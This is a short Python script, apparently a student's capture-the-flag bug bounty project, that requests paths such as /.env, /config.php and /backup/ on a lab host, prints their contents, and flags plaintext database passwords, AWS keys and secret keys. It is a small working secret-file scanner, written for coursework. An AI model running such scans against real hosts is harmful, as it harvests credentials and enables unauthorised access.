
#  COMP2152 — Term Project: CTF Bug Bounty
#  Vulnerability: Directory Listing + Exposed .env File
#  Author: Rasul
#  Branch: rasul_env_exposed
#
#  Description:
#    files.0x10.cloud has directory listing enabled, exposing
#    all files including a .env file containing plaintext
#    database credentials, AWS keys, and Redis passwords.
#    Anyone can access these secrets without authentication.


import urllib.request
import urllib.error
import time

BASE = "http://files.0x10.cloud"

PATHS = [
    "/",
    "/.env",
    "/config.php",
    "/secret/",
    "/backup/",
    "/uploads/",
]

print("=" * 55)
print("  SCAN: Directory Listing + .env Exposure")
print("  Target: files.0x10.cloud")
print("  Author: Rasul")
print("=" * 55)

findings = []

for path in PATHS:
    url = BASE + path
    try:
        response = urllib.request.urlopen(url, timeout=5)
        content = response.read(2000).decode(errors="ignore")
        print(f"\n[EXPOSED] {url}")
        print(f"  Status : {response.status}")
        print(f"  Content preview:")
        for line in content.splitlines()[:15]:
            print(f"    {line}")
        findings.append((path, response.status, content))

    except urllib.error.HTTPError as e:
        print(f"\n[HTTP {e.code}] {url}")
    except Exception as e:
        print(f"\n[ERROR] {url} → {e}")

    time.sleep(0.15)

print()
print("=" * 55)
print("RESULTS")
print("=" * 55)

if findings:
    print(f"\nEXPOSED FILES/DIRECTORIES: {len(findings)}")
    for path, status, content in findings:
        print(f"\n  [HTTP {status}] {BASE}{path}")
        if "DB_PASS" in content or "db_pass" in content:
            print("  !! DATABASE PASSWORD FOUND IN PLAINTEXT !!")
        if "AWS" in content:
            print("  !! AWS CREDENTIALS FOUND !!")
        if "SECRET_KEY" in content or "secret_key" in content:
            print("  !! SECRET KEY FOUND !!")
        if "Index of" in content:
            print("  !! DIRECTORY LISTING ENABLED !!")

    print()
    print("VULNERABILITY CONFIRMED:")
    print("  files.0x10.cloud has directory listing enabled.")
    print("  The .env file is publicly readable and contains:")
    print("    - DB_HOST, DB_USER, DB_PASS in plaintext")
    print("    - AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY")
    print("    - REDIS_URL with password")
    print("  An attacker can use these credentials to access")
    print("  the database, AWS account, and Redis instance.")
else:
    print("No exposed files found.")